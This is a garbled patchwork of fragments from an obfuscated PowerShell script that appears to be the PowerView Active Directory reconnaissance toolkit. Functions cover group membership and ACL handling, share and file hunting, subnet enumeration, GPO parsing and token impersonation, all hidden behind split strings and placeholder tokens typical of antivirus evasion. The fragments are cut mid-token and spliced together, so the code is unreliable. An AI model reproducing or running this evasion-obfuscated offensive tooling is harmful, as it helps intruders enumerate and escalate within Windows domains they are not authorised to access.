-fS5zgontimS5z,S5zlastlS5z,S5zoS5z,S5zestampS5z),(Z3b{3}{2}{1}{0}Z3b -f S5zyflagsS5z,S5zcalpolicS5z,S5zoS5z,S5zlS5z),(Z3b{0}{1}{2}Z3b -fS5zloS5z,S5zgoncounS5z,S5ztS5z),(Z3b{0}{3}{1}{5}{2}{4}Z3b -fS5zmS5z,S5zedeS5z,S5zptiS5z,S5zsds-supportS5z,S5zontypesS5z,S5zncryS5z),(Z3b{1}{0}Z3b -fS5zmeS5z,S5znaS5z),(Z3b{3}{2}{0}{1}Z3b -fS5zatS5z,S5zegoryS5z,S5ztcS5z,S5zobjecS5z),(Z3b{1}{2}{0}Z3b -f S5zassS5z,S5zobS5z,S5zjectclS5z),(Z3b{2}{0}{1}Z3b -f S5zectguS5z,S5zidS5z,S5zobjS5z),(Z3b{0}{1}{2}Z3b-f S5zobjS5z,S5zecS5z,S5ztsidS5z),(Z3b{1}{3}{2}{0}Z3b-fS5zemS5z,S5zoperatingS5z,S5zstS5z,S5zsyS5z),(Z3b{3}{7}{4}{1}{2}{0}{6}{5}','Z3bDIJKistINIJKguiSHIJKEIJKDNamEZ3b

            
            if (YoV{grIJKOuPmAIJKNAGER}.Z3bSAIJKMAIJKCCIJKOUnTIJKTYpEZ3b -eq 0x10000000) {
                YoV{mAnaGIJKEdgIJKRIJKoUp} JGO &(Z3b{2}{0}{1}Z3b-f S5zemS5z,S5zberS5z,S5zAdd-MS5z) (Z3b{3}{0}{2}{1}Z3b-f S5zotS5z,S5zpertyS5z,S5zeproS5z,S5zNS5z) (Z3b{2}{0}{1}{3}Z3b-fS5znaS5z,S5zgeS5z,S5zMaS5z,S5zrTypeS5z) (Z3b{1}{0}Z3b-fS5zupS5z,S5zGroS5z)
            }
            elseif (YoV{GrOIJKUpmIJKAIJKNageR}.Z3bSaIJKMaCIJKcoIJKUntTYpEZ3b -eq 0x30000000) {
                YoV{MaIJKNIJKAgEdgIJKRIJKouP} JGO &(Z3b{1}{2}{0}{3}Z3b -fS5zemS5z,S5zAdd-S5z,S5zMS5z,S5zberS5z) (Z3b{1}{0}{2}{3}Z3b -fS5zpS5z,S5zNoteS5z,S5zropeS5z,S5zrtyS5z) (Z3b{0}{1}{2}Z3b -fS5zManagS5z,S5zeS5z,S5zrTypeS5z) (Z3b{0}{1}Z3b -f S5zUseS5z,S5zrS5z)
            }

            YoV{aIJKcLAIJKRGIJKUIJKmEnTs} = @{
                (Z3b{0}{1}{2}Z3b -fS5zIdentS5z,S5zitS5z,S5zyS5z) = YoV{_}.Z3bdIIJKstIIJKNgUIIJKshEIJKdIJKNAmEZ3b
                (Z3b{0}{1}{2}Z3b -fS5zRighS5z,S5ztsFiltS5z,S5zerS5z) = (Z3b{1}{2}{0}Z3b -f S5zsS5z,S5zWriteS5z,S5zMemberS5z)
            }
            if (YoV{PsbIJKouIJKNdPaIJKRAIJKmeTers}[(Z3b{0}{1}{2}Z3b -f S5zSeS5z,S5zrS5z,S5zverS5z)]) { YoV{aCLIJKARIJKgUMIJKENTS}[(Z3b{0}{1}Z3b-fS5zSS5z,S5zerverS5z)] = YoV{sEIJKRvIJKEr} }
            if (YoV{pIJKSBOUNDIJKparAIJKmEterS}[(Z3b{1}{0}{3}{2}Z3b-f S5zarS5z,S5zSeS5z,S5zScopeS5z,S5zchS5z)]) { YoV{aIJKclAIJKRgUmIJKeNTs}[(Z3b{2}{0}{3}{1}Z3b -f S5zrchS5z,S5zeS5z,S5zSeaS5z,S5zScopS5z)] = YoV{sEAIJKRchsIJKCOIJKpE} }
            if (YoV{pSbIJKoUnIJKDpARIJKAMIJKeTeRs}[(Z3b{1}{3}{4}{0}{2}Z3b -fS5ztS5z,S5zRS5z,S5zPageSizeS5z,S5zesS5z,S5zulS5z)]) { YoV{ACLIJKARGumEIJKNTs}[(Z3b{1}{2}{0}Z3b -fS5zSizeS5z,S5zResulS5z,S5ztPageS5z)] = YoV{ResULIJKTIJKpaIJKGESIzE} }
            if (YoV{PSIJKBIJKOuNdpArIJKAmEIJKTeIJKRS}[(Z3b{0}{3}{2}{1}Z3b -f S5zServS5z,S5zLimitS5z,S5zmeS5z,S5zerTiS5z)]) { YoV{acIJKlIJKArGIJKUMeNTS}[(Z3b{1}{0}{3}{4}{2}Z3b-fS5zerS5z,S5zSS5z,S5zitS5z,S5zverTimS5z,S5zeLimS5z)] = YoV{SIJKeRvEIJKRIJKTiMELiMIt} }
            if (YoV{PSBoUnIJKDIJKpIJKARAMeIJKTIJKeRS}[(Z3b{1}{0}{2}Z3b -f S5zbS5z,S5zTomS5z,S5zstoneS5z)]) { YoV{aCLArGuMIJKenIJKTS}[(Z3b{0}{2}{1}Z3b-f S5zTS5z,S5ztoneS5z,S5zombsS5z)] = YoV{tIJKOmIJKBsTIJKONE} }
            if (YoV{psIJKBOUNDIJKpIJKARaIJKMetIJKERs}[(Z3b{2}{1}{0}Z3b -f S5zdentialS5z,S5zreS5z,S5zCS5z)]) { YoV{aIJKCIJKLarGUMENTS}[(Z3b{0}{3}{2}{1}Z3b-fS5zCS5z,S5zentialS5z,S5zedS5z,S5zrS5z)] = YoV{CreIJKdeIJKNTIIJKAl} }

            
            
            
            
            
            
            
            
            
            
            

            YoV{MaNAgEdIJKGIJKRoIJKUp} JGO &(Z3b{1}{3}{2}{0}Z3b-fS5zrS5z,S5zAS5z,S5z-MembeS5z,S5zddS5z) (Z3b{1}{2}{3}{0}Z3b-fS5zyS5z,S5zNoS5z,S5zteproperS5z,S5ztS5z) (Z3b{0}{1}{2}{3}Z3b-fS5zManagS5z,S5zerCanWS5z,S5zriS5z,S5zteS5z) (Z3b{1}{0}Z3b -fS5zKNOWNS5z,S5zUNS5z)

            YoV{MAIJKNAgedIJKGIJKROUp}.Z3bPsOBIJKJIJKECTZ3b.Z3bTIJKyPeNAmesZ3b.(Z3b{1}{0}Z3b-fS5zsertS5z,S5zInS5z).Invoke(0, (Z3b{1}{2}{5}{3}{4}{0}Z3b-f S5ztyGroupS5z,S5zPoweS5z,S5zrVieS5z,S5zageS5z,S5zdSecuriS5z,S5zw.ManS5z))
            YoV{maNAgEDIJKgIJKROuP}
        }
    }
}


function GIJKet-IJKdoMAInGIJKRIJKoIJKUPmembeR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{1}{0}{2}{3}{4}Z3b -f S5zuS5z,S5zPSShoS5z,S5zlS5z,S5zdProS5z,S5zcessS5z}, S5zS5z)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{0}{5}{9}{7}{1}{2}{4}{6}{3}{8}Z3b-fS5zPSUsS5z,S5zMS5z,S5zoreThaS5z,S5zntS5z,S5znAssigS5z,S5zeDeclaredVS5z,S5znmeS5z,S5zrsS5z,S5zsS5z,S5zaS5z}, S5zS5z)]
    [OutputType({Z3b{1}{3}{2}{4}{0}Z3b -f S5zerS5z,S5zPoS5z,S5ziewS5z,S5zwerVS5z,S5z.GroupMembS5z})]
    [CmdletBinding(DeFauLTpaRAmEtErSETNaMe = {Z3b{0}{1}Z3b -fS5zNoS5z,S5zneS5z})]
    Param(
        [Parameter(PoSItIon = 0, mAnDAtorY = YoV{TRIJKUE}, vaLUEFROMPiPELINe = YoV{TIJKRUe}, VAluEfromPiPelInEbyPROPerTynaMe = YoV{trIJKUE})]
        [Alias({Z3b{4}{3}{2}{0}{1}Z3b-fS5zdNaS5z,S5zmeS5z,S5zguisheS5z,S5znS5z,S5zDistiS5z}, {Z3b{2}{1}{0}{3}Z3b -fS5zuntS5z,S5zcoS5z,S5zSamAcS5z,S5zNameS5z}, {Z3b{0}{1}Z3b -fS5zNS5z,S5zameS5z}, {Z3b{5}{3}{2}{1}{0}{4}{6}Z3b-f S5zsheS5z,S5ziS5z,S5zerDistinguS5z,S5zmbS5z,S5zdS5z,S5zMeS5z,S5zNameS5z}, {Z3b{2}{0}{1}Z3b -fS5zmberNamS5z,S5zeS5z,S5zMeS5z})]
        [String[]]
        YoV{idEIJKNTIJKity},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{dOIJKMAin},

        [Parameter(PaRAMEtErsETNAMe = Z3bmanUIJKAlIJKRecURIJKSEZ3b)]
        [Switch]
        YoV{reIJKCuRIJKSe},

        [Parameter(PaRAmEteRSeTNAmE = Z3bReCuIJKRSeuIJKSIJKiNIJKgMatcIJKhIJKIngruLEZ3b)]
        [Switch]
        YoV{reIJKcuRsIJKeusIJKiIJKNGmAtIJKcHInGRIJKULe},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{0}Z3b-fS5zlterS5z,S5zFiS5z})]
        [String]
        YoV{lIJKDapIJKFIIJKlTEr},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{2}{1}{0}Z3b-f S5zPathS5z,S5zDSS5z,S5zAS5z})]
        [String]
        YoV{SIJKeAIJKRcIJKhbaSe},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3','        }
    }
}


function fIndIJK-INTIJKERESIJKTingIJKdoMaIIJKNsHArIJKEfIJKIle {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{1}{0}{3}{2}Z3b-f S5zldS5z,S5zPSShouS5z,S5zssS5z,S5zProceS5z}, S5zS5z)]
    [OutputType({Z3b{1}{2}{3}{0}Z3b-fS5zView.FoundFileS5z,S5zPoS5z,S5zwe','RIpTpIJKARIJKAMS} = @{
                (Z3b{2}{1}{0}{3}Z3b-fS5zAccS5z,S5zkShareS5z,S5zChecS5z,S5zessS5z) = YoV{ChEcIJKkSHIJKAIJKReaIJKcCESS}
                (Z3b{2}{0}{1}Z3b-f S5zkenHS5z,S5zandleS5z,S5zToS5z) = YoV{lIJKoIJKGONTOIJKkeN}
            }

            
            &(Z3b{2}{1}{0}{4}{3}Z3b-fS5zncS5z,S5zeadedFuS5z,S5zNew-ThrS5z,S5znS5z,S5ztioS5z) -ComputerName YoV{TIJKAIJKRgEIJKTcoMPuTIJKeIJKRs} -ScriptBlock YoV{HoIJKsTENUIJKmBlOCK} -ScriptParameters YoV{ScIJKRiPtPIJKAIJKRAms} -Threads YoV{tHrIJKEAds}
        }
    }

    END {
        if (YoV{lOGOIJKNtOIJKKEn}) {
            &(Z3b{3}{1}{2}{0}Z3b-fS5zertToSelfS5z,S5zeS5z,S5z-RevS5z,S5zInvokS5z) -TokenHandle YoV{LoGoIJKNTIJKokEn}
','            try { YoV{REsIJKUIJKlts}.(Z3b{2}{1}{0}Z3b-f S5zseS5z,S5zispoS5z,S5zdS5z).Invoke() }
                catch {
                    &(Z3b{0}{2}{1}{3}Z3b-f S5zWS5z,S5zrboS5z,S5zrite-VeS5z,S5zseS5z) (Z3b{5}{6}{1}{4}{8}{2}{3}{10}{7}{0}{9}Z3b-f S5zResuS5z,S5zDomainSite] ErrorS5z,S5zpS5z,S5zosiS5z,S5z S5z,S5z[GeS5z,S5zt-S5z,S5zof the S5z,S5zdisS5z,S5zlts objectS5z,S5zng S5z)
                }
            }
            YoV{SitesIJKEarIJKCHIJKer}.(Z3b{1}{0}Z3b -f S5zisposeS5z,S5zdS5z).Invoke()
        }
    }
}


function gIJKeIJKT-DoIJKMAiNsUbNEt {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{0}{2}{1}Z3b -f S5zPSShS5z,S5zldProcessS5z,S5zouS5z}, S5zS5z)]
    [OutputType({Z3b{0}{4}{1}{3}{2}Z3b-f S5zPoweS5z,S5ziS5z,S5zw.SubnetS5z,S5zeS5z,S5zrVS5z})]
    [CmdletBinding()]
    Param (
        [Parameter(POsition = 0, valuEfrOMpIpelINe = YoV{TIJKRUE}, VALUEfrompipELiNEByPRopErTyNamE = YoV{tRIJKUe})]
        [Alias({Z3b{0}{1}Z3b-f S5zNaS5z,S5zmeS5z})]
        [String[]]
        YoV{IDENtIJKiIJKTY},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{SIIJKTENIJKAmE},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{DOIJKmAIN},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{0}Z3b-fS5zerS5z,S5zFiltS5z})]
        [String]
        YoV{LIJKDIJKAIJKPfiLtER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{PropEIJKRIJKTIJKies},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{1}Z3b -fS5zADSS5z,S5zPathS5z})]
        [String]
        YoV{sIJKEIJKArCIJKHbaSe},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{3}{1}{2}{0}Z3b -f S5zerS5z,S5zoS5z,S5zntrollS5z,S5zDomainCS5z})]
        [String]
        YoV{sIJKERVIJKEr},

        [ValidateSet({Z3b{0}{1}Z3b -fS5zBaS5z,S5zseS5z}, {Z3b{0}{1}{2}Z3b -f S5zOneS5z,S5zLevS5z,S5zelS5z}, {Z3b{0}{1}Z3b -fS5zSubS5z,S5ztreeS5z})]
        [String]
        YoV{SeArchSIJKCIJKOPe} = (Z3b{0}{1}Z3b-fS5zSuS5z,S5zbtreeS5z),

        [ValidateRange(1, 10000)]
        [Int]
        YoV{ReSIJKUIJKLTPAgeSIJKiZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{sErveRTIJKiMEliIJKMIJKiT},

        [ValidateSet({Z3b{1}{0}Z3b-fS5zaclS5z,S5zDS5z}, {Z3b{0}{1}Z3b -fS5zGS5z,S5zroupS5z}, {Z3b{0}{1}Z3b -f S5zNoS5z,S5zneS5z}, {Z3b{0}{1}Z3b-f S5zOwnS5z,S5zerS5z}, {Z3b{1}{0}Z3b-fS5zclS5z,S5zSaS5z})]
        [String]
        YoV{sECIJKURI','KChinESIJKId}.(Z3b{1}{2}{0}Z3b-f S5zOfS5z,S5zLastIndS5z,S5zexS5z).Invoke(S5z-S5z))

                        YoV{mEIJKMBEIJKRs} JGO &(Z3b{3}{1}{2}{4}{0}Z3b-fS5zectS5z,S5zorS5z,S5zEach-S5z,S5zFS5z,S5zObjS5z) {
                            if (YoV{_}.Z3bsIJKidZ3b -match YoV{MIJKAcHIJKinEIJKsID}) {','N = 0, ValUEfromPiPeliNe = YoV{TrIJKUe}, vALuefRoMpIPeLiNEbypROperTYNAme = YoV{tIJKRuE})]
        [Alias({Z3b{0}{1}Z3b -f S5zNaS5z,S5zmeS5z})]
        [String[]]
        YoV{iDEIJKNTIIJKTy},

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias({Z','oV{fiIJKLIJKTeR}
                (Z3b{1}{2}{0}Z3b -f S5zlS5z,S5zCreS5z,S5zdentiaS5z) = YoV{cRIJKEIJKdentIal}
            }

            
            &(Z3b{2}{1}{3}{0}Z3b -f S5zonS5z,S5zThreaS5z,S5zNew-S5z,S5zdedFunctiS5z) -ComputerName YoV{tARIJKGeTcOIJKmPIJKUTIJKeRS} -ScriptBlock YoV{HOstEnIJKUmIJKBIJKlIJKOCk} -ScriptParameters YoV{ScrIPIJKTIJKPAraIJKMs} -Threads YoV{ThrIJKeaIJKDs}
        }
    }
}


function FIJKInd-IJKDOmaINsIJKhIJKArE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{3}{2}{0}{1}Z3b-f S5zProcS5z,S5zessS5z,S5zhouldS5z,S5zPSSS5z}, S5zS5z)]
    [OutputType({Z3b{0}{4}{3}{2}{1}{6}{5}Z3b -fS5zPoS5z,S5zrS5z,S5zShaS5z,S5zerView.S5z,S5zwS5z,S5znfoS5z,S5zeIS5z})]
    Param(
        [Parameter(PosiTIon = 0, ValuEfROmPiPELINe = YoV{TIJKRUE}, vALUEFrOmpIPeLInebyPrOpERTyNAme = YoV{trIJKUE})]
        [Alias({Z3b{3}{2}{0}{1}Z3b-fS5zsS5z,S5ztNameS5z,S5zoS5z,S5zDNSHS5z})]
        [String[]]
        YoV{COMPIJKUTeRnaIJKme},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{1}Z3b-f ','}{1}{0}Z3b -f S5zialS5z,S5zedentS5z,S5zCrS5z)]) {
                            YoV{GIJKRoUIJKPsIJKid} = &(Z3b{0}{1}{2}Z3b-fS5zConvertTS5z,S5zo-S5z,S5zSIDS5z) -ObjectName YoV{grIJKoUPnIJKAMe} -Credential YoV{CrIJKEdIJKEntiaL}
                        }
                        else {
                            YoV{gIJKROUPSiD} = &(Z3b{1}{0}{2}Z3b -fS5zrS5z,S5zConveS5z,S5ztTo-SIDS5z) -ObjectName YoV{GRIJKoIJKUpNAMe}
                        }
                    }
                }

                
                YoV{MeIJKmbeIJKRs} = YoV{_}.Z3bPropeIJKRtIJKieSZ3b.Z3bMeIJKMIJKBERSZ3b JGO &(Z3b{2}{0}{1}Z3b-fS5zelect-ObjecS5z,S5ztS5z,S5zSS5z) -ExpandProperty (Z3b{0}{1}Z3b -fS5zMeS5z,S5zmberS5z) JGO &(Z3b{3}{0}{1}{2}Z3b -fS5zereS5z,S5z-S5z,S5zObjectS5z,S5zWhS5z) { YoV{_}.Z3bAIJKctiOnZ3b -match S5zADDS5z } JGO &(Z3b{0}{3}{2}{1}Z3b-f S5zFoS5z,S5ztS5z,S5zjecS5z,S5zrEach-ObS5z) {
                    if (YoV{_}.Z3bsIJKIdZ3b) { YoV{_}.Z3bsIJKIDZ3b }
                    else { YoV{_}.Z3bnaIJKMEZ3b }
                }

                if (YoV{MIJKemBIJKERS}) {
                    
                    if (YoV{_}.Z3bfiIJKLterSZ3b) {
                        YoV{FIJKILtERS} = YoV{_}.Z3bFiIJKLIJKTErSZ3b.(Z3b{4}{1}{3}{0}{2}Z3b-f S5zaS5z,S5ztS5z,S5ztorS5z,S5zEnumerS5z,S5zGeS5z).Invoke() JGO &(Z3b{2}{3}{1}{0}Z3b -fS5zectS5z,S5zbjS5z,S5zFS5z,S5zorEach-OS5z) {
                            &(Z3b{0}{1}{2}Z3b -f S5zNS5z,S5zew-S5z,S5zObjectS5z) -TypeName (Z3b{1}{2}{0}Z3b -fS5zctS5z,S5zPSOS5z,S5zbjeS5z) -Propert','  [String]
        YoV{METIJKHod} = S5zAPIS5z,

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{2}{0}{4}{3}Z3b -f S5zrS5z,S5zDomainCoS5z,S5zntS5z,S5zlerS5z,S5zolS5z})]
        [String]
        YoV{sERIJKVeR},

        [ValidateSet({Z3b{1}{0}Z3b -fS5zeS5z,S5zBasS5z}, {Z3b{2}{0}{1}Z3b -fS5zeLS5z,S5zevelS5z,S5zOnS5z}, {Z3b{0}{1}{2}Z3b-f S5zSubS5z,S5ztrS5z,S5zeeS5z})]
        [String]
        YoV{sIJKeaRIJKCHScopE} = (Z3b{2}{0}{1}Z3b -fS5zreS5z,S5zeS5z,S5zSubtS5z),

        [ValidateRange(1, 10000)]
        [Int]
        YoV{rIJKeSULTPAGIJKESIJKIZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{SErIJKVERTIMIJKelImIJKit},

        [Switch]
        YoV{tomIJKBSToIJKNe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{credEntIJKIIJKAL} =  (&(Z3b{1}{2}{3}{0}Z3b-f S5zbLeS5z,S5zGet-vAS5z,S5zRiS5z,S5zAS5z)  (S5zjS5z+S5zfIS5z)  -vAL  )::Z3beMIJKPTYZ3b,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{DeLIJKAy} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        YoV{jIJKIttIJKER} = .3,

        [Int]
        [ValidateRange(1, 100)]
        YoV{tHIJKRIJKEAdS} = 20
    )

    BEGIN {
        YoV{COIJKmPuTEIJKRSEARcherIJKARGumEIJKNTs} = @{
            (Z3b{1}{0}{2}Z3b-f S5zopertiS5z,S5zPrS5z,S5zesS5z) = (Z3b{0}{2}{1}Z3b -fS5zdnsS5z,S5zmeS5z,S5zhostnaS5z)
        }
        if (YoV{PSbIJKOUNDpAIJKRIJKAMeTers}[(Z3b{3}{2}{0}{1}{4}Z3b -f S5zrS5z,S5zDomS5z,S5zuteS5z,S5zCompS5z,S5zainS5z)]) { YoV{cIJKOmputerseaIJKRCIJKHIJKeIJKRArGIJKUIJKmEnTs}[(Z3b{2}{0}{1}Z3b-fS5zmS5z,S5zainS5z,S5zDoS5z)] = YoV{comIJKPuIJKTEIJKRDIJKOMain} }
        if (YoV{PsIJKBounIJKdpIJKAraMEIJKTEIJKRs}[(Z3b{1}{2}{3}{0}Z3b -fS5zerS5z,S5zCompuS5z,S5zterLDAPS5z,S5zFiltS5z)]) { YoV{cIJKOIJKmPuTIJKeRIJKsEaRchErIJKArGIJKUIJKmIJKenTS}[(Z3b{2}{0}{1}Z3b -f S5zAPFS5z,S5zilterS5z,S5zLDS5z)] = YoV{cOIJKMIJKpuTeRldIJKApFIJKILIJKTEr} }
        if (YoV{PIJKSboUNdIJKPIJKAIJKRIJKAmeTErS}[(Z3b{3}{2}{5}{0}{4}{1}Z3b -fS5zhS5z,S5zaseS5z,S5zpuS5z,S5zComS5z,S5zBS5z,S5zterSearcS5z)]) { YoV{compIJKUteIJKRSeIJKARcHIJKerArguMEnTS}[(Z3b{1}{2}{0}Z3b -f S5zaseS5z,S5zSearchS5z,S5zBS5z)] = YoV{COMIJKpUterSIJKEIJKARCIJKHbASE} }
        if (YoV{pSbIJKOUNdpAIJKRAmEIJKTerS}[(Z3b{0}{2}{3}{1}Z3b-f S5zUncS5z,S5zstrainedS5z,S5zoS5z,S5znS5z)]) { YoV{COIJKmputErSEIJKARCheIJKRARGUmeIJKNTS}[(Z3b{3}{2}{1}{0}Z3b -fS5znedS5z,S5zonstraiS5z,S5zcS5z,S5zUnS5z)] = YoV{UNconsIJKTRaiIJKNED} }
        if (YoV{PIJKSIJKBoundPARIJKAMeteIJKRS}[(Z3b{4}{1}{3}{5}{2}{6}{0}Z3b -f S5zstemS5z,S5zterS5z,S5zingSS5z,S5zOperS5z,S5zCompuS5z,S5zatS5z,S5zyS5z)]) { YoV','earchS5z)]) { YoV{FIJKILesEIJKRVErSIJKEaIJKRCheIJKRARGUmeNTs}[(Z3b{1}{0}{2}Z3b-fS5zchScoS5z,S5zSearS5z,S5zpeS5z)] = YoV{sEarCHIJKsIJKcIJKOPE} }
                    if (YoV{pIJKSIJKBOUnDIJKParaMeIJKTERs}[(Z3b{3}{1}{0}{2}{4}Z3b -f S5ztPageSS5z,S5zlS5z,S5ziS5z,S5zResuS5z,S5zzeS5z)]) { YoV{filEIJKSERVerSEIJKArChIJKeIJKRAIJKRIJKGUIJKMIJKEnts}[(Z3b{1}{3}{2}{0}Z3b-f S5zizeS5z,S5zRS5z,S5zultPageSS5z,S5zesS5z)] = YoV{reSuLtPIJKAIJKgEsIZe} }
                    if (YoV{PsIJKBOunIJKdIJKPAIJKRamETeIJKRS}[(Z3b{0}{1}{3}{2}Z3b-f S5zSerS5z,S5zverTimeS5z,S5zitS5z,S5zLimS5z)]) { YoV{FiIJKlIJKeSeIJKRveIJKRseAIJKRCIJKheraIJKRgIJKUMENTs}[(Z3b{1}{3}{2}{0}{4}Z3b-fS5zLimiS5z,S5zServS5z,S5zimeS5z,S5zerTS5z,S5ztS5z)] = YoV{SeIJKRIJKVertImEliIJKMit} }
                    if (YoV{PSIJKBOuIJKNDIJKparIJKAmeTerS}[(Z3b{1}{0}{2}Z3b-f S5znS5z,S5zTombstoS5z,S5zeS5z)]) { YoV{fIleIJKseIJKRvErsEIJKARIJKcIJKHeRaRGIJKUmEnts}[(Z3b{1}{0}Z3b-fS5zbstoneS5z,S5zTomS5z)] = YoV{ToMbIJKSIJKToNE} }
                    if (YoV{psBOUIJKNIJKDPArAmEIJKTErS}[(Z3b{1}{0}{2}Z3b -fS5zedS5z,S5zCrS5z,S5zentialS5z)]) { YoV{FiLIJKeSeIJKRVERsEIJKAIJKRCHIJKeRARIJKguMENts}[(Z3b{1}{3}{2}{0}Z3b -f S5zntialS5z,S5zCS5z,S5zdeS5z,S5zreS5z)] = YoV{cIJKReDIJKentIJKIal} }
                    YoV{FIlEseIJKRIJKVEIJKRS} = &(Z3b{4}{5}{1}{2}{0}{3}Z3b -fS5zeS5z,S5ziS5z,S5zlS5z,S5zServerS5z,S5zGetS5z,S5z-DomainFS5z) @FileServerSearcherArguments
                    if (YoV{fIJKIIJKleSERvEIJKRs} -isnot [System.Array]) { YoV{FILEseRIJKVIJKERs} = @(YoV{fIIJKLeSEIJKRIJKVErs}) }
                    YoV{TaRGIJKetCoIJKMpuTeRIJKArIJKRaYLIsT}.(Z3b{0}{2}{1}Z3b-f S5zAddS5z,S5zngeS5z,S5zRaS5z).Invoke( YoV{FilESEIJKRIJKVeRs} )
                }
                if (YoV{sTIJKEIJKALthIJKSIJKOurCE} -match (((Z3b{2}{0}{1}Z3b-f S5z0S5z,S5z}AllS5z,S5zDFS{S5z)) -f[CHAR]124)) {
                    &(Z3b{2}{0}{','{1}{0}Z3b -fS5zrS5z,S5zServeS5z)] = YoV{SEIJKRvIJKer} }
        if (YoV{pSIJKBoIJKUNDIJKpArIJKAmeTeRs}[(Z3b{0}{1}{2}Z3b -fS5zCredS5z,S5zentiS5z,S5zalS5z)]) { YoV{CONverIJKTIJKAIJKRIJKguMIJKenTS}[(Z3b{2}{0}{1}Z3b -f S5zntiS5z,S5zalS5z,S5zCredeS5z)] = YoV{CIJKREIJKdENtiIJKAL} }
    }

    PROCESS {
        if (YoV{PSbOUNdIJKPaRAmEIJKTIJKERS}[(Z3b{1}{0}Z3b-fS5zomainS5z,S5zDS5z)]) {
            YoV{sIJKeaRchIJKeRargUMIJKeNtS}[(Z3b{2}{1}{0}Z3b-f S5znS5z,S5zaiS5z,S5zDomS5z)] = YoV{DoIJKMaIN}
            YoV{cIJKOIJKNVeRTaIJKRGIJKUIJKments}[(Z3b{1}{0}Z3b -f S5zainS5z,S5zDomS5z)] = YoV{DIJKOmaIn}
        }

        if (YoV{POIJKlIcY} -eq S5zAllS5z) {
            YoV{sIJKEArcHeIJKRaRGUMIJKeNts}[(Z3b{2}{1}{0}Z3b -f S5ztyS5z,S5zntiS5z,S5zIdeS5z)] = S5z*S5z
        }
        elseif (YoV{poIJKLiIJKcY} -eq (Z3b{1}{0}Z3b -f S5zomainS5z,S5zDS5z)) {
            YoV{seaRchIJKErArguIJKmenIJKTs}[(Z3b{0}{2}{1}Z3b-fS5zIdeS5z,S5ztyS5z,S5zntiS5z)] = S5z{31B2F340-016D-11D2-945F-00C04FB984F9}S5z
        }
        elseif ((YoV{PIJKOliCy} -eq (Z3b{0}{2}{1}Z3b -fS5zDomS5z,S5ztrollerS5z,S5zainConS5z)) -or (YoV{POlIJKIcY} -eq S5zDCS5z)) {
            YoV{sIJKEAIJKRcHeRarIJKguMeIJKNtS}[(Z3b{1}{0}Z3b -f S5zentityS5z,S5zIdS5z)] = S5z{6AC1786C-016F-11D2-945F-00C04FB984F9}S5z
        }
        else {
            YoV{searCIJKhIJKERAIJKRgUIJKMentS}[(Z3b{1}{0}{2}Z3b-f S5ziS5z,S5zIdentS5z,S5ztyS5z)] = YoV{pOIJKlIJKiCY}
        }

        YoV{gIJKpOREsuIJKltS} = &(Z3b{2}{0}{1}Z3b-f S5zGS5z,S5zPOS5z,S5zGet-DomainS5z) @SearcherArguments

        ForEach (YoV{GIJKpO} in YoV{gpOIJKReIJKsuLIJKTS}) {
            
            YoV{gptTMplIJKPAIJKTH} = YoV{GIJKPo}.Z3bGpcfiIJKlEsIJKYsPIJKAtHZ3b + (((Z3b{6}{3}{8}{7}{15}{11}{10}{9}{13}{14}{12}{0}{4}{5}{1}{2}Z3b -fS5zt{0S5z,S5ztTmpl.iS5z,S5znfS5z,S5zMS5z,S5z}S5z,S5zGpS5z,S5z{0}S5z,S5zINS5z,S5zACHS5z,S5z0S5z,S5zft{S5z,S5zsoS5z,S5zs NT{0}SecEdiS5z,S5z}WindoS5z,S5zwS5z,S5zE{0}MicroS5z))-F [ChAR]92)

            YoV{pIJKArseIJKArgs} =  @{
                (Z3b{2}{1}{0}Z3b-f S5zplPathS5z,S5ztTmS5z,S5zGpS5z) = YoV{gpTtMIJKpLIJKpIJKAth}
                (Z3b{1}{2}{0}Z3b-fS5zutObjectS5z,S5zOS5z,S5zutpS5z) = YoV{TRIJKUE}
            }
            if (YoV{psboIJKUnDIJKpIJKArAIJKmEIJKTERS}[(Z3b{1}{2}{0}Z3b -f S5zedentialS5z,S5zCS5z,S5zrS5z)]) { YoV{pIJKARSIJKEaRgS}[(Z3b{1}{0}{2}{3}Z3b-f S5zdeS5z,S5zCreS5z,S5zntiaS5z,S5zlS5z)] = YoV{credENIJKTIJKiAL} }

            
            &(Z3b{3}{0}{2}{1}Z3b-fS5zt-GS5z,S5zTmplS5z,S5zptS5z,S5zGeS5z) @ParseArgs JGO &(Z3b{3}{0}{2}{1}Z3b-f S5zach-ObjS5z,S5ztS5z,S5zecS5z,S5zForES5z) {
                YoV{_} JGO &(Z3b{1}{2}{0}Z3b -fS5zemberS5z,S5zAdd-S5z,S5zMS5z) (Z3b{1}{2}{0}Z3b-fS5zpertyS5z,S5zNS5z,S5zoteproS5z) (Z3b{1}{0}Z3b-fS5zameS5z,S5zGPONS5z) YoV{gIJKPO}.Z3bnIJKAMeZ3b
                YoV{_} JGO &(Z3b{2}{0}{1}Z3b -f S5zd-S5z,S5zMemberS5z,S5zAdS5z) (Z3b{1}{2}{3}{0}Z3b -f S5zepropertyS5z,S5zNS5z,S5zoS5z,S5ztS5z) (Z3b{4}{1}{3}{2}{0}Z3b -fS5zameS5z,S5zPODiS5z,S5zlayNS5z,S5zspS5z,S5zGS5z) YoV{GIJKpO}.Z3bDisIJKpLAyIJKNAMeZ3b
                YoV{_}
            }
